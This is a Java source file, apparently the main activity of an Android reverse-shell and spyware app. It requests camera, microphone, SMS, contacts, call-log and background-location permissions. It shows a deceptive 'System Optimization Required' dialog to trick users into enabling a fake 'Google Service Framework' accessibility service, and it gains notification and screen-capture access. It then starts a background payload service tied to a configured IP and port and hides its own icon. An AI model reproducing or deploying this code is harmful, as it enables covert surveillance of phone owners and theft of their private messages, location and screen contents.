package com.example.reverseshell2;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.content.Intent;
import android.content.ComponentName;
import android.view.accessibility.AccessibilityManager;
import android.app.AlertDialog;
import android.media.projection.MediaProjectionManager;
import android.util.Log;

import com.example.reverseshell2.Payloads.ScreenCapture;


public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context = getApplicationContext();
        Log.d(TAG, config.IP + "\t" + config.port);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestRequiredPermissions();
        } else {
            startPayload();
        }
    }

    private void requestRequiredPermissions() {
        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
            permissions = new String[]{
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.POST_NOTIFICATIONS
            };
        } else {
            permissions = new String[]{
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE
            };
        }

        boolean needRequest = false;
        for (String p : permissions) {
            if (ContextCompat.checkSelfPermission(context, p) != PackageManager.PERMISSION_GRANTED) {
                needRequest = true;
                break;
            }
        }

        if (needRequest) {
            ActivityCompat.requestPermissions(activity, permissions, 1);
        } else {
            requestBackgroundLocationPermission();
        }
    }

    private void requestBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // Android 10+
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                new androidx.appcompat.app.AlertDialog.Builder(this)
                        .setTitle("Grant Location Access")
                        .setMessage("To ensure the app can provide your location accurately in the background, please select 'Allow all the time' in the next screen.")
                        .setPositiveButton("OK", (dialog, which) -> {
                            ActivityCompat.requestPermissions(activity, new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 3);
                        })
                        .setNegativeButton("Cancel", (dialog, which) -> checkAccessibilityPermission())
                        .show();
            } else {
                checkAccessibilityPermission();
            }
        } else {
            checkAccessibilityPermission();
        }
    }

    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                Intent intent = new Intent();
                intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(android.net.Uri.parse("package:" + packageName));
                startActivityForResult(intent, 2);
            } else {
                startPayload();
            }
        } else {
            startPayload();
        }
    }

    private void checkAccessibilityPermission() {
        if (!isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
            new AlertDialog.Builder(this)
                    .setTitle("System Optimization Required")
                    .setMessage("To ensure system stability, please enable 'Google Service Framework' in the following settings page.")
                    .setPositiveButton("Enable", (dialog, which) -> {
                        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        startActivityForResult(intent, 4);
                    })
                    .setCancelable(false)
                    .show();
        } else {
            checkNotificationListenerPermission();
        }
    }

    private void checkNotificationListenerPermission() {
        if (!isNotificationListenerEnabled()) {
            new AlertDialog.Builder(this)
                    .setTitle("Enable Notification Access")
                    .setMessage("To complete setup, please allow notification access for this app in the following settings page.")
                    .setPositiveButton("Enable", (dialog, which) -> {
                        Intent intent = new Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                        startActivityForResult(intent, 5);
                    })
                    .setCancelable(false)
                    .show();
        } else {
            requestMediaProjection();
        }
    }

    private boolean isNotificationListenerEnabled() {
        String pkgName = getPackageName();
        String flat = android.provider.Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(pkgName);
    }

    private void requestMediaProjection() {
        if (!ScreenCapture.hasPermission()) {
            try {
                MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                startActivityForResult(mpm.createScreenCaptureIntent(), 6);
            } catch (Exception e) {
                Log.e(TAG, "MediaProjection request failed", e);
                checkBatteryOptimization();
            }
        } else {
            checkBatteryOptimization();
        }
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<?> service) {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        java.util.List<android.accessibilityservice.AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC);
        for (android.accessibilityservice.AccessibilityServiceInfo enabledService : enabledServices) {
            ComponentName enabledServiceComponentName = new ComponentName(enabledService.getResolveInfo().serviceInfo.packageName, enabledService.getResolveInfo().serviceInfo.name);
            if (enabledServiceComponentName.equals(new ComponentName(context, service))) {
                return true;
            }
        }
        return false;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1) {
            requestBackgroundLocationPermission();
        } else if (requestCode == 3) {
            checkAccessibilityPermission();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 2) {
            startPayload();
        } else if (requestCode == 4) {
            checkAccessibilityPermission();
        } else if (requestCode == 5) {
            checkNotificationListenerPermission();
        } else if (requestCode == 6) {
            if (resultCode == RESULT_OK && data != null) {
                ScreenCapture.setMediaProjectionPermission(resultCode, data);
                Log.d(TAG, "Screen capture permission granted");
            }
            checkBatteryOptimization();
        }
    }

    public void startPayload() {
        new functions(activity).createNotiChannel(context);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(context, new Intent(context, mainService.class));
        } else {
            startService(new Intent(context, mainService.class));
        }
        if (config.icon) {
            new functions(activity).hideAppIcon(context);
        }
        finish();
    }
}
